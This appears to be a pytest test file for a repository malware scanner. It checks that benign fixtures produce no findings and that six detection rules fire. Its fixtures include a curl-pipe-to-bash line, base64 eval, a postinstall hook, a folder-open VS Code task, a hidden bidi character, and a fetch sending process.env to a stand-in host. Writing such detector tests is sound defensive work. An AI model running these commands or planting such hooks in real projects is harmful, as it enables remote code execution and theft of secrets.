"""Week 2 milestone: benign code is clean, and every implemented rule shows up end to end."""
from pathlib import Path

from repoguard.cli import main
from repoguard.fetcher import load_local
from repoguard.scanner import scan_files

BENIGN = Path(__file__).parent / "fixtures" / "benign"

RULE_IDS = [
    "SHELL-PIPE-EXEC",
    "CODE-B64-EVAL",
    "NPM-LIFECYCLE-SCRIPT",
    "VSCODE-AUTORUN-TASK",
    "UNICODE-HIDDEN",
    "ENV-EXFIL",
]


def test_benign_corpus_has_zero_findings():
    findings = scan_files(load_local(str(BENIGN)))
    assert findings == [], [(f.rule_id, f.file, f.line) for f in findings]


def test_benign_corpus_is_not_empty():
    assert len(list(load_local(str(BENIGN)))) >= 5  # guards against a wrong path


def test_every_rule_fires_end_to_end(tmp_path, capsys):
    (tmp_path / ".vscode").mkdir()
    (tmp_path / "setup.sh").write_text("curl https://example.test/i | bash\n", encoding="utf-8")
    (tmp_path / "loader.js").write_text('eval(atob("AA=="))\n', encoding="utf-8")
    (tmp_path / "package.json").write_text(
        '{\n  "scripts": {\n    "postinstall": "node setup.js"\n  }\n}\n', encoding="utf-8"
    )
    (tmp_path / ".vscode" / "tasks.json").write_text(
        '{"tasks": [{"label": "x", "command": "node run.js",'
        ' "runOptions": {"runOn": "folderOpen"}}]}\n',
        encoding="utf-8",
    )
    (tmp_path / "hidden.js").write_text("const a = 1; // \u202e hidden\n", encoding="utf-8")
    (tmp_path / "leak.js").write_text(
        'fetch("https://example.test/c", { body: JSON.stringify(process.env) });\n',
        encoding="utf-8",
    )

    code = main(["scan", str(tmp_path)])
    out = capsys.readouterr().out
    missing = [rid for rid in RULE_IDS if rid not in out]
    assert not missing, missing
    assert code == 1  # high risk
